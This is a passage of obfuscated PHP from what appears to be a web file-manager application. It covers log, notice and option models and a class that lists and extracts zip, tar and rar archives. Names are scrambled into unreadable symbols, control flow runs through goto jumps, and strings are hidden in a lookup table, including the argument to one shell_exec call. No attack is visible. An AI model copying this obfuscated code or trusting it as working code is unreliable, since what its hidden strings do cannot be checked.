Model($A©øé¨ãå[477])->userListInfo(array_unique($F“É–Ωâ–ä)); goto b∂¶ê©É–ì; b∂¶ê©É–ì: $Aí√ë‰˜ùÁ = $this->getSourceList($E¨¶œ‘¯¥´); $B£úÛµ˘«◊ = $this->typeAll(); $b∑ƒ’◊Øìä = array(); goto d≠àõà≈Û©; d≠àõà≈Û©: $Fä”êáÜ‘› = array(); foreach ($E¨¶œ‘¯¥´ as $d…ÇœåÊªü => $BÒ∆©ã®µ®) { goto AÈäàÙÖÛ”; B‹∑¨Ñ⁄Çà: unset($BÒ∆©ã®µ®[$A©øé¨ãå[2474]]); $b∑ƒ’◊Øìä[] = $BÒ∆©ã®µ®; goto F‘ãØ¡ÜÌœ; AÈäàÙÖÛ”: $C©´ÍñÛ§… = $BÒ∆©ã®µ®[$A©øé¨ãå[29]]; $DßàÏπ≤ôÜ = isset($E¬∫Ëñ°‘”[$BÒ∆©ã®µ®[$A©øé¨ãå[1438]]]) ? $E¬∫Ëñ°‘”[$BÒ∆©ã®µ®[$A©øé¨ãå[1438]]] : !1; $CÚıÚç≠¨ﬁ = strpos($C©´ÍñÛ§…, $A©øé¨ãå[2472]) === 0 ? LNG($A©øé¨ãå[2473]) : LNG($A©øé¨ãå[2468]); goto Bà±ãƒëµ∂; Bà±ãƒëµ∂: $BÒ∆©ã®µ®[$A©øé¨ãå[28]] = isset($DßàÏπ≤ôÜ[$A©øé¨ãå[28]]) ? $DßàÏπ≤ôÜ[$A©øé¨ãå[28]] : LNG($A©øé¨ãå[2468]); $BÒ∆©ã®µ®[$A©øé¨ãå[2336]] = isset($DßàÏπ≤ôÜ[$A©øé¨ãå[2336]]) ? $DßàÏπ≤ôÜ[$A©øé¨ãå[2336]] : $A©øé¨ãå[33]; $BÒ∆©ã®µ®[$A©øé¨ãå[1344]] = isset($B£úÛµ˘«◊[$C©´ÍñÛ§…]) ? $B£úÛµ˘«◊[$C©´ÍñÛ§…] : $CÚıÚç≠¨ﬁ; goto DÕâ¯Üêˆ˘; EŒΩíòåÒœ: $this->ipAddress($BÒ∆©ã®µ®); if (strpos($C©´ÍñÛ§…, $A©øé¨ãå[2289]) === 0 || isset($a–Ïˆß„≠ƒ[$A©øé¨ãå[2288]])) { goto E†«∞ü¯™ó; b«ô∑áô–È: if ($a–Ïˆß„≠ƒ[$A©øé¨ãå[29]] == $A©øé¨ãå[2296]) { $a–Ïˆß„≠ƒ[$A©øé¨ãå[405]][$A©øé¨ãå[369]] = $Aí√ë‰˜ùÁ[$a–Ïˆß„≠ƒ[$A©øé¨ãå[405]][$A©øé¨ãå[369]]]; } if ($a–Ïˆß„≠ƒ[$A©øé¨ãå[29]] == $A©øé¨ãå[2072]) { $a–Ïˆß„≠ƒ[$A©øé¨ãå[2301]] = $a–Ïˆß„≠ƒ[$A©øé¨ãå[391]]; $a–Ïˆß„≠ƒ[$A©øé¨ãå[2288]] = $a–Ïˆß„≠ƒ[$A©øé¨ãå[2301]][$A©øé¨ãå[369]]; $a–Ïˆß„≠ƒ[$A©øé¨ãå[391]] = !1; $a–Ïˆß„≠ƒ[$A©øé¨ãå[369]] = $A©øé¨ãå[33]; } if ($a–Ïˆß„≠ƒ[$A©øé¨ãå[391]] && $a–Ïˆß„≠ƒ[$A©øé¨ãå[391]][$A©øé¨ãå[371]] == $A©øé¨ãå[1084]) { $Fä”êáÜ‘›[] = $BÒ∆©ã®µ®[$A©øé¨ãå[367]]; unset($E¨¶œ‘¯¥´[$d…ÇœåÊªü]); continue; } goto f´∞Æ•∞ıƒ; E†«∞ü¯™ó: $a–Ïˆß„≠ƒ[$A©øé¨ãå[391]] = $Aí√ë‰˜ùÁ[$a–Ïˆß„≠ƒ[$A©øé¨ãå[369]]]; $a–Ïˆß„≠ƒ[$A©øé¨ãå[2301]] = $Aí√ë‰˜ùÁ[$a–Ïˆß„≠ƒ[$A©øé¨ãå[2288]]]; if ($a–Ïˆß„≠ƒ[$A©øé¨ãå[29]] == $A©øé¨ãå[492]) { $a–Ïˆß„≠ƒ[$A©øé¨ãå[405]][$A©øé¨ãå[1011]] = $Aí√ë‰˜ùÁ[$a–Ïˆß„≠ƒ[$A©øé¨ãå[405]][$A©øé¨ãå[1011]]]; $a–Ïˆß„≠ƒ[$A©øé¨ãå[405]][$A©øé¨ãå[1012]] = $Aí√ë‰˜ùÁ[$a–Ïˆß„≠ƒ[$A©øé¨ãå[405]][$A©øé¨ãå[1012]]]; } goto b«ô∑áô–È; f´∞Æ•∞ıƒ: if ($a–Ïˆß„≠ƒ[$A©øé¨ãå[2301]] && $a–Ïˆß„≠ƒ[$A©øé¨ãå[2301]][$A©øé¨ãå[371]] == $A©øé¨ãå[1084]) { $Fä”êáÜ‘›[] = $BÒ∆©ã®µ®[$A©øé¨ãå[367]]; unset($E¨¶œ‘¯¥´[$d…ÇœåÊªü]); continue; } goto bì›¯ì‰¿ﬂ; bì›¯ì‰¿ﬂ: } $BÒ∆©ã®µ®[$A©øé¨ãå[405]] = $a–Ïˆß„≠ƒ; goto B‹∑¨Ñ⁄Çà; DÕâ¯Üêˆ˘: $BÒ∆©ã®µ®[$A©øé¨ãå[2244]] = $DßàÏπ≤ôÜ; $a–Ïˆß„≠ƒ = json_decode($BÒ∆©ã®µ®[$A©øé¨ãå[405]], !0); $BÒ∆©ã®µ®[$A©øé¨ãå[2467]] = isset($a–Ïˆß„≠ƒ[$A©øé¨ãå[2467]]) ? $a–Ïˆß„≠ƒ[$A©øé¨ãå[2467]] : $A©øé¨ãå[33]; goto EŒΩíòåÒœ; F‘ãØ¡ÜÌœ: } $this->clearSystemPathLog($Fä”êáÜ‘›); goto e‡µ≠’ıÕ—; d—ﬁúÍ∆Ïæ: } private function clearSystemPathLog($açºÖùõãΩ) { $bòîÌ∂∏Ìø =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (count($açºÖùõãΩ) == 0) { return; } $DÇ‘”≥òÕä = array($bòîÌ∂∏Ìø[367] => array($bòîÌ∂∏Ìø[7], array_unique($açºÖùõãΩ))); $this->where($DÇ‘”≥òÕä)->delete(); } public function deviceList($e≤õ™Í‘Íˆ, $f¶ÊòÌÖ£‰ = 0) { $eº¬Êƒ–ãñ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $cﬁô‡≈Âêà = array($eº¬Êƒ–ãñ[1438] => $e≤õ™Í‘Íˆ, $eº¬Êƒ–ãñ[187] => array($eº¬Êƒ–ãñ[932], $f¶ÊòÌÖ£‰), $eº¬Êƒ–ãñ[29] => $eº¬Êƒ–ãñ[2045]); $fä™ﬁÛ¶Ì— = array(); $d„™ö¨∞ãÇ = $this->field($eº¬Êƒ–ãñ[2475])->where($cﬁô‡≈Âêà)->order($eº¬Êƒ–ãñ[2299])->limit(50)->select(); foreach ($d„™ö¨∞ãÇ as $E∂Ã¶á«ÁŸ => $bç∏Ü˘á°õ) { goto E¡›‹¯ê®Ÿ; aà»Æ„ƒíæ: unset($Dµ„§‰ÍﬁË[$eº¬Êƒ–ãñ[2467]]); $Aú§ﬁê∏€‰ = $this->deviceType($Dµ„§‰ÍﬁË[$eº¬Êƒ–ãñ[2290]]); if (isset($fä™ﬁÛ¶Ì—[$Aú§ﬁê∏€‰])) { continue; } goto cé‹›ﬁƒúÉ; cé‹›ﬁƒúÉ: $this->ipAddress($bç∏Ü˘á°õ); $bç∏Ü˘á°õ[$eº¬Êƒ–ãñ[405]] = $Dµ„§‰ÍﬁË; $fä™ﬁÛ¶Ì—[$Aú§ﬁê∏€‰] = $bç∏Ü˘á°õ; goto B•ÊÜÚœÎœ; E¡›‹¯ê®Ÿ: if ($E∂Ã¶á«ÁŸ > 0 && abs($bç∏Ü˘á°õ[$eº¬Êƒ–ãñ[187]] - $d„™ö¨∞ãÇ[$E∂Ã¶á«ÁŸ - 1][$eº¬Êƒ–ãñ[187]]) < 5) { continue; } $Dµ„§‰ÍﬁË = json_decode($bç∏Ü˘á°õ[$eº¬Êƒ–ãñ[405]], !0); $bç∏Ü˘á°õ[$eº¬Êƒ–ãñ[2467]] = isset($Dµ„§‰ÍﬁË[$eº¬Êƒ–ãñ[2467]]) ? $Dµ„§‰ÍﬁË[$eº¬Êƒ–ãñ[2467]] : $eº¬Êƒ–ãñ[33]; goto aà»Æ„ƒíæ; B•ÊÜÚœÎœ: } return array_values($fä™ﬁÛ¶Ì—); } public function deviceType($EëËƒµç¡é) { return $EëËƒµç¡é; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\x65\x6d\x2e\x6e\x6f\x74\x69\x63\x65\x4c\x69\163\164"; public $field = array("\x6e\x61\x6d\145", "\143\157\x6e\164\145\x6e\x74", "\x61\165\164\x68", "\155\157\x64\x65", "\164\x69\x6d\x65", "\x74\171\160\145", "\x6c\145\x76\145\x6c", "\145\156\141\142\x6c\x65", "\x73\x6f\x72\x74"); public function listData($a◊à∏É°Ê˜ = false, $Bãü”èüﬁÆ = "\x73\157\162\164", $aî¨âÍÇîÁ = false) { return parent::listData($a◊à∏É°Ê˜, $Bãü”èüﬁÆ, $aî¨âÍÇîÁ); } public function add($E†Àéü±æÀ) { $dßÒÍç…‡° =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $c°à˘œ∞ò¨ = time(); if ($E†Àéü±æÀ[$dßÒÍç…‡°[12]] == $dßÒÍç…‡°[2476]) { $c°à˘œ∞ò¨ = strtotime($E†Àéü±æÀ[$dßÒÍç…‡°[190]]); } $E†Àéü±æÀ[$dßÒÍç…‡°[190]] = $c°à˘œ∞ò¨; return parent::insert($E†Àéü±æÀ); } public function update($d‘√Ü€éüò, $bîÖ˜ö†¨ç) { goto E¥·òóç¯¡; C™∏Ûè∏º∏: $BÂÊßå˘â£ = time(); if ($bîÖ˜ö†¨ç[$FÊ–ÚÁÙº°[12]] == $FÊ–ÚÁÙº°[2476]) { $BÂÊßå˘â£ = strtotime($bîÖ˜ö†¨ç[$FÊ–ÚÁÙº°[190]]); } $bîÖ˜ö†¨ç[$FÊ–ÚÁÙº°[190]] = $BÂÊßå˘â£; goto b¡£á≤¯è; E¥·òóç¯¡: $FÊ–ÚÁÙº° =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $Eó“âûû´Ê = $this->listData($d‘√Ü€éüò); if (!$Eó“âûû´Ê) { return !1; } goto C™∏Ûè∏º∏; b¡£á≤¯è: return parent::update($d‘√Ü€éüò, $bîÖ˜ö†¨ç); goto fØøÜñ◊ã°; fØøÜñ◊ã°: } public function remove($Aáê≈úÎ±ö) { $e…÷çˆéï = $this->listData($Aáê≈úÎ±ö); if (!$e…÷çˆéï || $e…÷çˆéï[$_SERVER[Ä¿¡‡öóµŸﬂ‡][1084]]) { return !1; } return parent::remove($Aáê≈úÎ±ö); } public function sort($e™‡œ™âÛ¿, $Fà„ÂÛ‹Áé) { return parent::update($e™‡œ™âÛ¿, $Fà„ÂÛ‹Áé); } public function enable($D®†≈åﬂ‡ò, $Aø∂ªŒ◊êå) { return parent::update($D®†≈åﬂ‡ò, array($_SERVER[Ä¿¡‡öóµŸﬂ‡][2477] => $Aø∂ªŒ◊êå)); } private function initUserOption() { $d±Œ∞ ∞£ï =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $this->optionType = $d±Œ∞ ∞£ï[2478]; $this->modelType = $d±Œ∞ ∞£ï[2479]; $this->field = array($d±Œ∞ ∞£ï[2480], $d±Œ∞ ∞£ï[28], $d±Œ∞ ∞£ï[190], $d±Œ∞ ∞£ï[29], $d±Œ∞ ∞£ï[2481], $d±Œ∞ ∞£ï[689], $d±Œ∞ ∞£ï[183]); } public function userNoticeGet($E≈Ì˘ˆÆÍå = false) { $this->initUserOption(); return parent::listData($E≈Ì˘ˆÆÍå, $_SERVER[Ä¿¡‡öóµŸﬂ‡][367], !0); } public function userNoticeAdd($B€çæ∑É¥Ò) { $cÜïÖ›‰Ùí =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $this->initUserOption(); $f©Âÿ¥ç·§ = $this->findByKey($cÜïÖ›‰Ùí[2480], $B€çæ∑É¥Ò[$cÜïÖ›‰Ùí[367]]); if ($f©Âÿ¥ç·§) { return !0; } $FÀïÈéùÇ“ = array($cÜïÖ›‰Ùí[2480] => $B€çæ∑É¥Ò[$cÜïÖ›‰Ùí[367]], $cÜïÖ›‰Ùí[28] => $B€çæ∑É¥Ò[$cÜïÖ›‰Ùí[28]], $cÜïÖ›‰Ùí[190] => $B€çæ∑É¥Ò[$cÜïÖ›‰Ùí[190]], $cÜïÖ›‰Ùí[29] => isset($B€çæ∑É¥Ò[$cÜïÖ›‰Ùí[29]]) ? $B€çæ∑É¥Ò[$cÜïÖ›‰Ùí[29]] : 1, $cÜïÖ›‰Ùí[2481] => isset($B€çæ∑É¥Ò[$cÜïÖ›‰Ùí[2481]]) ? $B€çæ∑É¥Ò[$cÜïÖ›‰Ùí[2481]] : 0, $cÜïÖ›‰Ùí[689] => 0, $cÜïÖ›‰Ùí[183] => 0); return parent::insert($FÀïÈéùÇ“); } public function userNoticeEdit($cÉµÓä´…Ï, $fÂçŸ˜æ∞) { $this->initUserOption(); return parent::update($cÉµÓä´…Ï, $fÂçŸ˜æ∞); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\x73\164\145\155\x5f\157\x70\x74\151\157\156"; protected $jsonField = array("\x6d\x65\156\x75", "\x72\x6f\x6c\145", "\162\157\154\x65\x47\162\157\165\x70", "\162\145\x67\151\163\x74", "\145\x6d\x61\x69\154"); function __construct() { parent::__construct(); } protected function cacheKey($FÂ∂¯ôØ™∏) { return "\123\171\x73\x74\x65\x6d\x4f\x70\164\x69\x6f\x6e\x5f{$FÂ∂¯ôØ™∏}"; } protected function optionDefault($eíÒ≠Ï∞Õ = '') { $Fó∫⁄òäçì =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if ($eíÒ≠Ï∞Õ == $Fó∫⁄òäçì[33]) { return $GLOBALS[$Fó∫⁄òäçì[6]][$Fó∫⁄òäçì[2482]]; } } } goto c·µÈû„¥ç; CéÑÎ ”ûÉ: class KodArchive { static function init() { goto aüÑá˜ö¶„; c±„¥£‚‘˘: require_once ARCHIVE_LIB . $dñß§Ôèáø[1898]; goto a®ÔÎÚ∂Ã; EÍÆÕ∞Çó⁄: require_once ARCHIVE_LIB . $dñß§Ôèáø[1895]; require_once ARCHIVE_LIB . $dñß§Ôèáø[1896]; require_once ARCHIVE_LIB . $dñß§Ôèáø[1897]; goto c±„¥£‚‘˘; AÑâêÎÂôö: mk_dir(TEMP_FILES); require_once ARCHIVE_LIB . $dñß§Ôèáø[1893]; require_once ARCHIVE_LIB . $dñß§Ôèáø[1894]; goto EÍÆÕ∞Çó⁄; aüÑá˜ö¶„: $dñß§Ôèáø =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (defined($dñß§Ôèáø[1887])) { return; } define($dñß§Ôèáø[1887], SDK_DIR . $dñß§Ôèáø[1888]); goto aÖë»™Ω‰Ù; aÖë»™Ω‰Ù: define($dñß§Ôèáø[1889], TEMP_FILES); define($dñß§Ôèáø[1890], TEMP_FILES); define($dñß§Ôèáø[1891], $dñß§Ôèáø[1892]); goto AÑâêÎÂôö; a®ÔÎÚ∂Ã: } static function checkIfType($Eˆ¶ÇœÖ⁄Ω, $c‰ÑÜ√≤Öì) { goto B∏…‹‹‚˘Œ; A¿ÕËâ◊‚„: $F’ûï˜ÉÆÚ = in_array($Eˆ¶ÇœÖ⁄Ω, $eåÔå©á™Ø[$c‰ÑÜ√≤Öì]); if ($F’ûï˜ÉÆÚ && ($c‰ÑÜ√≤Öì == $Båœπ…äßœ[301] || $c‰ÑÜ√≤Öì == $Båœπ…äßœ[1902]) && (!function_exists($Båœπ…äßœ[1910]) || !function_exists($Båœπ…äßœ[1911]))) { show_tips($Båœπ…äßœ[1912]); } if ($F’ûï˜ÉÆÚ && $c‰ÑÜ√≤Öì == $Båœπ…äßœ[1049] && (!function_exists($Båœπ…äßœ[1913]) || !strstr(shell_exec($Båœπ…äßœ[1914]), $Båœπ…äßœ[1915]))) { show_tips($Båœπ…äßœ[1916]); } goto c›óΩÎ´çÕ; B∏…‹‹‚˘Œ: $Båœπ…äßœ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; self::init(); $eåÔå©á™Ø = array($Båœπ…äßœ[301] => array($Båœπ…äßœ[301], $Båœπ…äßœ[1899], $Båœπ…äßœ[1900], $Båœπ…äßœ[1901]), $Båœπ…äßœ[1902] => array($Båœπ…äßœ[1902], $Båœπ…äßœ[1903], $Båœπ…äßœ[1047], $Båœπ…äßœ[1045]), $Båœπ…äßœ[1049] => array($Båœπ…äßœ[1049], $Båœπ…äßœ[1904], $Båœπ…äßœ[1905], $Båœπ…äßœ[1906], $Båœπ…äßœ[1907], $Båœπ…äßœ[1908], $Båœπ…äßœ[1909])); goto A¿ÕËâ◊‚„; c›óΩÎ´çÕ: return $F’ûï˜ÉÆÚ; goto E‘Öá‘Óáµ; E‘Öá‘Óáµ: } static function listContent($C⁄üÜ¡÷˘Ç, $e›ôüÜÙ¢Ÿ = true) { $dàÜ∂ÍÆ˘∆ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; self::init(); $D Öêõ∆…… = !empty($GLOBALS[$dàÜ∂ÍÆ˘∆[1053]]) ? $GLOBALS[$dàÜ∂ÍÆ˘∆[1053]] : get_path_ext($C⁄üÜ¡÷˘Ç); $BŒ·»ÉúÉ® = !1; if (self::checkIfType($D Öêõ∆……, $dàÜ∂ÍÆ˘∆[1902])) { $cçÒ±Ø‚¬€ = PclTarList($C⁄üÜ¡÷˘Ç, $D Öêõ∆……); $BŒ·»ÉúÉ® = array(); for ($BÜÑ‹çØÇÕ = 0; $BÜÑ‹çØÇÕ < count($cçÒ±Ø‚¬€); $BÜÑ‹çØÇÕ++) { $E¨∆ÃÃ∏ŒŒ = $cçÒ±Ø‚¬€[$BÜÑ‹çØÇÕ]; if ($E¨∆ÃÃ∏ŒŒ[$dàÜ∂ÍÆ˘∆[1917]] == $dàÜ∂ÍÆ˘∆[1918] || $E¨∆ÃÃ∏ŒŒ[$dàÜ∂ÍÆ˘∆[1917]] == $dàÜ∂ÍÆ˘∆[1919]) { continue; } if ($e›ôüÜÙ¢Ÿ) { $E¨∆ÃÃ∏ŒŒ[$dàÜ∂ÍÆ˘∆[1920]] = ltrim($E¨∆ÃÃ∏ŒŒ[$dàÜ∂ÍÆ˘∆[1920]], $dàÜ∂ÍÆ˘∆[1158]); } if ($E¨∆ÃÃ∏ŒŒ[$dàÜ∂ÍÆ˘∆[1917]] == $dàÜ∂ÍÆ˘∆[1921]) { $E¨∆ÃÃ∏ŒŒ[$dàÜ∂ÍÆ˘∆[76]] = !0; } else { $E¨∆ÃÃ∏ŒŒ[$dàÜ∂ÍÆ˘∆[76]] = !1; } $E¨∆ÃÃ∏ŒŒ[$dàÜ∂ÍÆ˘∆[1040]] = $BÜÑ‹çØÇÕ; $BŒ·»ÉúÉ®[] = $E¨∆ÃÃ∏ŒŒ; } } else { if (self::checkIfType($D Öêõ∆……, $dàÜ∂ÍÆ˘∆[1049])) { $d‘Ç‰πé¯ô = kodRarArchive::listContent($C⁄üÜ¡÷˘Ç); if (!$d‘Ç‰πé¯ô[$dàÜ∂ÍÆ˘∆[1036]]) { return $d‘Ç‰πé¯ô; } else { $BŒ·»ÉúÉ® = $d‘Ç‰πé¯ô[$dàÜ∂ÍÆ˘∆[1038]]; } } else { if (kodZipArchive::support($dàÜ∂ÍÆ˘∆[354])) { $BŒ·»ÉúÉ® = kodZipArchive::listContent($C⁄üÜ¡÷˘Ç); } else { $büèí÷û—ß = new PclZip($C⁄üÜ¡÷˘Ç); $BŒ·»ÉúÉ® = $büèí÷û—ß->listContent(); } } } if ($BŒ·»ÉúÉ®) { $D—Œ∞ëâ® = unzip_charset_get($BŒ·»ÉúÉ®); $e›ôüÜÙ¢Ÿ = $e›ôüÜÙ¢Ÿ && function_exists($dàÜ∂ÍÆ˘∆[65]); for ($BÜÑ‹çØÇÕ = 0; $BÜÑ‹çØÇÕ < count($BŒ·»ÉúÉ®); $BÜÑ‹çØÇÕ++) { $BŒ·»ÉúÉ®[$BÜÑ‹çØÇÕ][$dàÜ∂ÍÆ˘∆[1920]] = str_replace(array($dàÜ∂ÍÆ˘∆[1076], $dàÜ∂ÍÆ˘∆[1922]), $dàÜ∂ÍÆ˘∆[772], $BŒ·»ÉúÉ®[$BÜÑ‹çØÇÕ][$dàÜ∂ÍÆ˘∆[1920]]); if ($e›ôüÜÙ¢Ÿ) { $BŒ·»ÉúÉ®[$BÜÑ‹çØÇÕ][$dàÜ∂ÍÆ˘∆[1920]] = iconv_to($BŒ·»ÉúÉ®[$BÜÑ‹çØÇÕ][$dàÜ∂ÍÆ˘∆[1920]], $D—Œ∞ëâ®, $dàÜ∂ÍÆ˘∆[326]); unset($BŒ·»ÉúÉ®[$BÜÑ‹çØÇÕ][$dàÜ∂ÍÆ˘∆[1923]]); } } return array($dàÜ∂ÍÆ˘∆[1036] => !0, $dàÜ∂ÍÆ˘∆[1038] => $BŒ·»ÉúÉ®); } else { return array($dàÜ∂ÍÆ˘∆[1036] => !1, $dàÜ∂ÍÆ˘∆[1038] => $BŒ·»ÉúÉ®); } } static function extract($côƒòôˆÖ£, $c≠∏ºïÙΩâ, $DöµØ‚ÇÜ˘ = "\55\x31", &$F∏ˆå“‘≈å = false) { goto DºÑË–ñÇ√; BíıŒÃæÀ‹: $BîÒù÷õî = self::listContent($côƒòôˆÖ£, !1); if (!$BîÒù÷õî[$bêÇÔ‚èìû[1036]]) { return $BîÒù÷õî; } if ($DöµØ‚ÇÜ˘ != $bêÇÔ‚èìû[1035]) { goto Cû◊äÑÏ–â; eπ«Òá›·À: if ($B›÷√®°ı£[$bêÇÔ‚èìû[76]]) { $F¿‰›áºá≈ = rtrim($F¿‰›áºá≈, $bêÇÔ‚èìû[8]) . $bêÇÔ‚èìû[8]; $F∏ˆå“‘≈å = array($F∏ˆå“‘≈å); } $dôŸ–æ›Ù÷ = str_replace($bêÇÔ‚èìû[93], $bêÇÔ‚èìû[8], $F¿‰›áºá≈); if (substr($dôŸ–æ›Ù÷, -1) == $bêÇÔ‚èìû[8]) { if (!strstr(trim($dôŸ–æ›Ù÷, $bêÇÔ‚èìû[8]), $bêÇÔ‚èìû[8])) { $c≠∏ºïÙΩâ = $c≠∏ºïÙΩâ . get_path_this($dôŸ–æ›Ù÷) . $bêÇÔ‚èìû[8]; } } else { if ($F§Ò◊éç‹È == $F¿‰›áºá≈) { $F§Ò◊éç‹È = $bêÇÔ‚èìû[33]; } } goto BáÊ›±õœ∞; c∂Ì¢ÜÖË»: if ($GLOBALS[$bêÇÔ‚èìû[6]][$bêÇÔ‚èìû[1156]] != $bêÇÔ‚èìû[326]) { $F¿‰›áºá≈ = unzip_pre_name($F∏ˆå“‘≈å); } $F§Ò◊éç‹È = get_path_father($F∏ˆå“‘≈å); if ($F§Ò◊éç‹È == $F∏ˆå“‘≈å) { $F§Ò◊éç‹È = $bêÇÔ‚èìû[33]; } goto eπ«Òá›·À; Cû◊äÑÏ–â: $B›÷√®°ı£ = self::fileIndex($BîÒù÷õî[$bêÇÔ‚èìû[1038]], $DöµØ‚ÇÜ˘); $F∏ˆå“‘≈å = str_replace(array($bêÇÔ‚èìû[1076], $bêÇÔ‚èìû[1922]), $bêÇÔ‚èìû[70], $B›÷√®°ı£[$bêÇÔ‚èìû[1920]]); $F¿‰›áºá≈ = $F∏ˆå“‘≈å; goto c∂Ì¢ÜÖË»; BáÊ›±õœ∞: } goto dã™ù¥‰‘ë; dã™ù¥‰‘ë: if (self::checkIfType($BË‡„Û•¨‡, $bêÇÔ‚èìû[1902])) { if ($DöµØ‚ÇÜ˘ != $bêÇÔ‚èìû[1035]) { $F¿‰›áºá≈ = unzip_pre_name($F¿‰›áºá≈); $F§Ò◊éç‹È = unzip_pre_name($F§Ò◊éç‹È); $BÜ—›∞ˆù = PclTarExtractList($côƒòôˆÖ£, array($F¿‰›áºá≈), $c≠∏ºïÙΩâ, $F§Ò◊éç‹È, $BË‡„Û•¨‡); } else { $BÜ—›∞ˆù = PclTarExtract($côƒòôˆÖ£, $c≠∏ºïÙΩâ, $bêÇÔ‚èìû[361], $BË‡„Û•¨‡); } return array($bêÇÔ‚èìû[1036] => $BÜ—›∞ˆù, $bêÇÔ‚èìû[1038] => PclErrorString(!0)); } else { if (self::checkIfType($BË‡„Û•¨‡, $bêÇÔ‚èìû[1049])) { return kodRarArchive::extract($côƒòôˆÖ£, $c≠∏ºïÙΩâ, $BË‡„Û•¨‡, $F∏ˆå“‘≈å); } else { if (kodZipArchive::support($bêÇÔ‚èìû[1924])) { return kodZipArchive::extract($côƒòôˆÖ£, $c≠∏ºïÙΩâ, $F∏ˆå“‘≈å); } else { $fÂ…ÒºÉŒÇ = new PclZip($côƒòôˆÖ£); if ($DöµØ‚ÇÜ˘ != $bêÇÔ‚èìû[1035]) { $BÜ—›∞ˆù = $fÂ…ÒºÉŒÇ->extract(PCLZIP_OPT_PATH, $c≠∏ºïÙΩâ, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $bêÇÔ‚èìû[1925], PCLZIP_OPT_BY_NAME, $B›÷√®°ı£[$bêÇÔ‚èìû[1920]], PCLZIP_OPT_REMOVE_PATH, $F§Ò◊éç‹È, PCLZIP_OPT_REPLACE_NEWER); } else { $BÜ—›∞ˆù = $fÂ…ÒºÉŒÇ->extract(PCLZIP_OPT_PATH, $c≠∏ºïÙΩâ, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $bêÇÔ‚èìû[1925], PCLZIP_OPT_REPLACE_NEWER); } return array($bêÇÔ‚èìû[1036] => $BÜ—›∞ˆù, $bêÇÔ‚èìû[1038] => $fÂ…ÒºÉŒÇ->errorName(!0)); } } } return array($bêÇÔ‚èìû[1036] => !1, $bêÇÔ‚èìû[1038] => $bêÇÔ‚èìû[1926]); goto E”†√Ú‘’∏; DºÑË–ñÇ√: $bêÇÔ‚èìû =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; self::init(); $BË‡„Û•¨‡ = !empty($GLOBALS[$bêÇÔ‚èìû[1053]]) ? $GLOBALS[$bêÇÔ‚èìû[1053]] : get_path_ext($côƒòôˆÖ£); goto BíıŒÃæÀ‹; E”†√Ú‘’∏: } static function fileIndex($AΩÁúÇ´Ò˜, $d”ø§µ∞æΩ, $b˜©ïÖ¶øµ = false) { goto D›¡–Ö¬»å; D›¡–Ö¬»å: $a©úëãÇÈù =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; self::init(); if (!is_array($AΩÁúÇ´Ò˜)) { return !1; } goto a¥Ùè≤≠õ¨; a¥Ùè≤≠õ¨: $fí•ñ£¬—Ü = count($AΩÁúÇ´Ò˜); for ($f¿ô£…¢¯ô = 0; $f¿ô£…¢¯ô < $fí•ñ£¬—Ü; $f¿ô£…¢¯ô++) { if ($d”ø§µ∞æΩ == $AΩÁúÇ´Ò˜[$f¿ô£…¢¯ô][$a©úëãÇÈù[1040]]) { $eÆªÑ¶é°ç = $AΩÁúÇ´Ò˜[$f¿ô£…¢¯ô]; break; } } if (!$eÆªÑ¶é°ç) { show_tips($a©úëãÇÈù[1927]); } goto CéÌ·Ø©º∞; CéÌ·Ø©º∞: $EØ§“®√¡∫ = $eÆªÑ¶é°ç; if ($b˜©ïÖ¶øµ) { $EØ§“®√¡∫ = $eÆªÑ¶é°ç[$b˜©ïÖ¶øµ]; if ($eÆªÑ¶é°ç[$a©úëãÇÈù[76]]) { $EØ§“®√¡∫ = rtrim($EØ§“®√¡∫, $a©úëãÇÈù[8]) . $a©úëãÇÈù[8]; } } return $EØ§“®√¡∫; goto bù¨û•«ë…; bù¨û•«ë…: } static function extractZipFile($FÜôàƒúÉ≠, $A™™πàÌÏ⁄, $F¢ÿ˜œÀÔû = false) { goto B≤∫≤ﬂçÑû; B≤∫≤ﬂçÑû: $DÌËŒÎ»°Ñ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; self::init(); $F©Ç‰óÖÂË = TEMP_FILES . hash_path($FÜôàƒúÉ≠) . $DÌËŒÎ»°Ñ[8]; goto c≥¥ﬂü’¨Ú; BÑ∑Ñ≈àÖµ: $F÷ï±€Ç˜˜ = get_path_father($A™™πàÌÏ⁄); if ($F÷ï±€Ç˜˜ == $A™™πàÌÏ⁄) { $F÷ï±€Ç˜˜ = $DÌËŒÎ»°Ñ[33]; } $aó¡èƒè·≤ = $CÔ„Ëõ®ãÏ->extract(PCLZIP_OPT_PATH, $F©Ç‰óÖÂË, PCLZIP_CB_PRE_FILE_NAME, $DÌËŒÎ»°Ñ[1925], PCLZIP_OPT_REMOVE_PATH, $F÷ï±€Ç˜˜, PCLZIP_OPT_BY_NAME, $A™™πàÌÏ⁄); goto BÇÍﬂÓÀû÷; Bæüï´ÀÃÃ: if (file_exists($EêÃ«ÍÁÕô)) { return $EêÃ«ÍÁÕô; } $CÔ„Ëõ®ãÏ = new PclZip($FÜôàƒúÉ≠); $eÖŸ∂”Ωî = unzip_filter_ext($F©Ç‰óÖÂË . get_path_this($A™™πàÌÏ⁄)); goto BÑ∑Ñ≈àÖµ; BÇÍﬂÓÀû÷: if (!file_exists($eÖŸ∂”Ωî)) { return !1; } @rename($eÖŸ∂”Ωî, $EêÃ«ÍÁÕô); return $EêÃ«ÍÁÕô; goto F”—ΩáŒ¡ï; c≥¥ﬂü’¨Ú: mk_dir($F©Ç‰óÖÂË); $EêÃ«ÍÁÕô = $F©Ç‰óÖÂË . 